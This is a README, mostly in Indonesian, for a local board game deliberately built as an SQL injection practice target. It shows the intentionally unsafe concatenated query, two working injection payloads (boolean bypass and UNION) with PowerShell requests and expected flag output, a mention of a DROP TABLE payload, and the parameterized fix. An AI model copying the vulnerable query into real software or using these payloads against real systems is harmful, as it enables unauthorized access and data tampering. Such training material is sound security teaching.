# Board Adventure

Board Adventure is a local mystery board game. The game can be completed by collecting lore notes and entering the final pass, while curious players can discover an alternate route hidden in one backend gate.

## Cara Execute

Pastikan Node.js sudah terpasang. Project ini sudah dites dengan Node.js `v22`.

### 1. Install dependency

Jalankan dari folder project:

```powershell
npm install
```

### 2. Jalankan mode development

```powershell
npm run dev
```

Buka game di browser:

```text
http://127.0.0.1:5173
```

Backend API berjalan di:

```text
http://127.0.0.1:3001
```

### 3. Jalankan test

```powershell
npm test
```

### 4. Build production

```powershell
npm run build
```

Setelah build, jalankan server:

```powershell
npm start
```

Lalu buka:

```text
http://127.0.0.1:3001
```

### 5. Reset data game

Database lokal dibuat otomatis di:

```text
data/board-adventure.sqlite
```

Untuk reset game, hentikan server lalu hapus file database tersebut. Saat server dijalankan lagi, database akan dibuat ulang otomatis.

```powershell
Remove-Item .\data\board-adventure.sqlite
```

### 6. Cek API manual

Health check:

```powershell
Invoke-RestMethod http://127.0.0.1:3001/api/health
```

Buat session pemain:

```powershell
$session = Invoke-RestMethod `
  -Uri http://127.0.0.1:3001/api/session/start `
  -Method Post `
  -ContentType "application/json" `
  -Body '{"name":"Player"}'

$session.sessionId
```

Cek gate dengan pass normal:

```powershell
Invoke-RestMethod `
  -Uri http://127.0.0.1:3001/api/gate/check `
  -Method Post `
  -Headers @{ "x-session-id" = $session.sessionId } `
  -ContentType "application/json" `
  -Body '{"code":"ASTRAL-7331"}'
```

## Case Hidden Gate

Kerentanan ada di `checkGateCode(inputCode)` pada `server/game.js`.

Query yang sengaja dibuat tidak aman:

```js
const query = `SELECT code, reward FROM gate_codes WHERE active = 1 AND code = '${inputCode}' LIMIT 1`;
```

Target input ada di UI **Terminal Gate** atau endpoint:

```text
POST /api/gate/check
```

### Case 1: Boolean bypass

Payload:

```text
' OR 1=1 --
```

Kenapa berhasil:

Input menutup quote setelah `code = '`, lalu menambahkan kondisi `OR 1=1`. Bagian akhir query dikomentari dengan `--`, jadi gate mengambil row aktif pertama dari `gate_codes`.

Contoh via PowerShell:

```powershell
$body = @{ code = "' OR 1=1 --" } | ConvertTo-Json

Invoke-RestMethod `
  -Uri http://127.0.0.1:3001/api/gate/check `
  -Method Post `
  -Headers @{ "x-session-id" = $session.sessionId } `
  -ContentType "application/json" `
  -Body $body
```

Hasil yang diharapkan:

```text
ok: true
finalPass: true
flag: FLAG{HIDDEN_GATE_OPENED}
```

### Case 2: UNION fabricated reward

Payload:

```text
' UNION SELECT 'made-up-code', 'final_pass' --
```

Kenapa berhasil:

Query asli memilih dua kolom: `code` dan `reward`. Payload ini membuat row palsu dengan dua kolom yang cocok. Karena `reward` berisi `final_pass`, game menerima hasilnya sebagai pass final.

Contoh via PowerShell:

```powershell
$body = @{ code = "' UNION SELECT 'made-up-code', 'final_pass' --" } | ConvertTo-Json

Invoke-RestMethod `
  -Uri http://127.0.0.1:3001/api/gate/check `
  -Method Post `
  -Headers @{ "x-session-id" = $session.sessionId } `
  -ContentType "application/json" `
  -Body $body
```

Hasil yang diharapkan:

```text
ok: true
finalPass: true
flag: FLAG{HIDDEN_GATE_OPENED}
```

Di UI, jika berhasil, panel kuning **Flag unlocked** akan muncul di sisi kanan game.

### Yang tidak jadi target case

- Stacked query seperti `'; DROP TABLE ...` tidak dijadikan skenario.
- Time-based payload tidak dipakai karena SQLite lokal di app ini tidak menyediakan fungsi delay bawaan.
- Kerentanan sengaja dibatasi di gate agar gameplay tetap stabil.

## Game Flow

- Start a run as an adventurer.
- Roll the dice to move across the board.
- Resolve item, clue, trap, and challenge tiles.
- Collect lore notes to learn the normal final pass.
- Use the Terminal Gate to claim `final_pass` and finish the game.

## Security Scope

This project is intentionally designed as a local practice target and must only be run locally.

- The SQLite database is created at `data/board-adventure.sqlite`.
- There is no production authentication.
- There are no external targets or remote database connections.
- The intentional backend flaw is isolated in `checkGateCode(inputCode)` in `server/game.js`.
- Other database access uses prepared statements.

## Maintainer Notes

The gate function builds a query by concatenating player input into a quoted text comparison. This is intentionally wrong and exists so the board game can be used as a controlled local challenge.

To make the game safe again, replace the raw query in `checkGateCode(inputCode)` with a parameterized statement.
